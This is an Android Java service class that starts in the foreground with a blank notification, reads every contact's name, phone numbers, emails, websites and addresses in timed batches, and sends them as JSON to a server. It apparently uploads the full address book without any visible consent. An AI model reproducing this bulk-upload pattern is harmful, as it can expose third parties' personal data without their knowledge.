package pro.kimd;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.provider.ContactsContract;
import android.util.Log;
import android.widget.Toast;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;

import androidx.core.app.NotificationCompat;

public class CoService2 extends Service {
    public CoService2() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            createNotificationChannel();
            Notification notification = new NotificationCompat.Builder(getApplicationContext(), "ForegroundServiceChannel")
                    .build();
            startForeground(1, notification);


        }
        try {
            ContentResolver cr = getContentResolver();
            final Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI, null,
                    null, null, null);
            final int count=cur.getCount()/100;
            if (count>0){
                int i=0;
                while (i<count+1){
                    final int finalI = i;
                    Handler handler=new Handler();

                    handler.postDelayed(new Runnable() {
                        @Override
                        public void run() {

                            try {
                                ShowContact(getApplicationContext(), String.valueOf((finalI)*100),"100");

                                if (finalI+1 ==count){
                                    Curdb curdb=new Curdb(CoService2.this);
                                    curdb.Insertcurr("ok");
                                    stopSelf();}
                            } catch (JSONException e) {
                                Toast.makeText(CoService2.this, e.toString(), Toast.LENGTH_SHORT).show();
                                e.printStackTrace();
                            }
                        }
                    },i*60000);

                    i++;
//                    if (i==count){stopSelf();}
                }
            }else {
                ShowContact(getApplicationContext(),"0", String.valueOf(cur.getCount()));
                Curdb curdb=new Curdb(CoService2.this);
                curdb.Insertcurr("ok");
                stopSelf();
            }

        } catch (JSONException e) {
            e.printStackTrace();
        }
//        Handler handler=new Handler();
//        handler.postDelayed(new Runnable() {
//            @Override
//            public void run() {
//                Curdb curdb=new Curdb(getApplicationContext());
//                curdb.Insertcurr("ok");
//                SendContact sendContact=new SendContact();
//                sendContact.sendcontac(getApplicationContext());
//            }
//        },120000);

        return super.onStartCommand(intent, flags, startId);
    }
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(
                    "ForegroundServiceChannel",
                    "Foreground Service Channel",
                    NotificationManager.IMPORTANCE_DEFAULT
            );
            NotificationManager manager = getSystemService(NotificationManager.class);

            manager.createNotificationChannel(serviceChannel);


        }
    }
    public void ShowContact(Context context,String first,String last) throws JSONException {
        ContentResolver cr = context.getContentResolver();
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI, null,
                null, null, " _id limit "+last+" offset "+first+" ");
        Log.i("taging12", String.valueOf(cur.getCount()) );
        if (cur.getCount() > 0) {


            SendContactToServer sendContactToServer = new SendContactToServer();
            JSONArray ARRAY = new JSONArray();
           while (cur.moveToNext()){
                JSONObject json = new JSONObject();
                JSONArray WEBarray = new JSONArray();
                JSONArray EMAILarray = new JSONArray();
                JSONArray ADDRESSarray = new JSONArray();
                JSONArray NUMBERarray = new JSONArray();


                String id = cur.getString(cur
                        .getColumnIndex(ContactsContract.Contacts._ID));
//                Log.d("taging233", id);
//                String count = cur.getString(cur
//                        .getColumnIndex(ContactsContract.Contacts.));
//                Toast.makeText(context, id, Toast.LENGTH_SHORT).show();
//                Log.d("_count", count);

                String name = cur
                        .getString(cur
                                .getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));

                ContactDataBaseManager contactDataBaseManager = new ContactDataBaseManager(context);
//                if (contactDataBaseManager.getcontact().contains(name)) {
//                } else {

                    if (Integer
                            .parseInt(cur.getString(cur
                                    .getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
                        // Query phone here. Covered next

                        Cursor pCur = cr.query(
                                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                                null,
                                ContactsContract.CommonDataKinds.Phone.CONTACT_ID
                                        + " = ?", new String[]{id}, null);

                        while (pCur.moveToNext()) {


                            // Do something with phones
                            String phoneNo = pCur
                                    .getString(pCur
                                            .getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                            NUMBERarray.put(phoneNo);
//                        JSON.put("name",name);


                        }
                        pCur.close();
                        Cursor emailCur = cr.query(
                                ContactsContract.CommonDataKinds.Email.CONTENT_URI,
                                null,
                                ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?",
                                new String[]{id}, null);
                        while (emailCur.moveToNext()) {

                            String email = emailCur.getString(emailCur.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA));
                            EMAILarray.put(email);
//                            Log.d("sendcontac", email);


                        }
                        final String[] projection = new String[]{
                                ContactsContract.CommonDataKinds.Website.URL,
                                ContactsContract.CommonDataKinds.Website.TYPE
                        };
                        String selection = ContactsContract.Data.CONTACT_ID + " = " + id + " AND " + ContactsContract.Contacts.Data.MIMETYPE + " = '" + ContactsContract.CommonDataKinds.Website.CONTENT_ITEM_TYPE + "'";

                        final Cursor webData = cr.query(ContactsContract.Data.CONTENT_URI, projection, selection, null, null);
                        while (webData.moveToNext()) {
                            int urlColumnIndex = webData.getColumnIndex(ContactsContract.CommonDataKinds.Website.URL);
                            String url = webData.getString(urlColumnIndex);
                            String urlType = webData.getString(webData.getColumnIndex(ContactsContract.CommonDataKinds.Website.TYPE));
                            WEBarray.put(url);
                        }
                        Cursor address_cursror = cr.query(ContactsContract.CommonDataKinds.StructuredPostal.CONTENT_URI, null, ContactsContract.CommonDataKinds.StructuredPostal.CONTACT_ID + " = ?", new String[]{id}, null);
                        while (address_cursror.moveToNext()) {
                            String adressname = address_cursror.getString(address_cursror.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.DISPLAY_NAME));
                            String street = address_cursror.getString(address_cursror.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.STREET));
                            String state = address_cursror.getString(address_cursror.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.REGION));
                            String zip = address_cursror.getString(address_cursror.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.POSTCODE));
                            String city = address_cursror.getString(address_cursror.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.CITY));
                            JSONObject jsonadress = new JSONObject();
                            jsonadress.put("name", adressname);
                            jsonadress.put("street", street);
                            jsonadress.put("state", state);
                            jsonadress.put("zip", zip);
                            jsonadress.put("city", city);
                            ADDRESSarray.put(jsonadress);

                        }

                        emailCur.close();

                    }
                    json.put("name", name);
                    json.put("number", NUMBERarray);
                    json.put("email", EMAILarray);
                    json.put("website", WEBarray);
                    json.put("adress", ADDRESSarray);

                    ARRAY.put(json);
                    contactDataBaseManager.Insertcontact(name,"");
//                }


            }
//            Log.i("taging123", ARRAY.toString() );
//            Toast.makeText(context, ARRAY.toString(), Toast.LENGTH_SHORT).show();
            SendContactToServer sendContactToServer1=new SendContactToServer();
            sendContactToServer1.Sent(context,ARRAY.toString());
        }
    }}

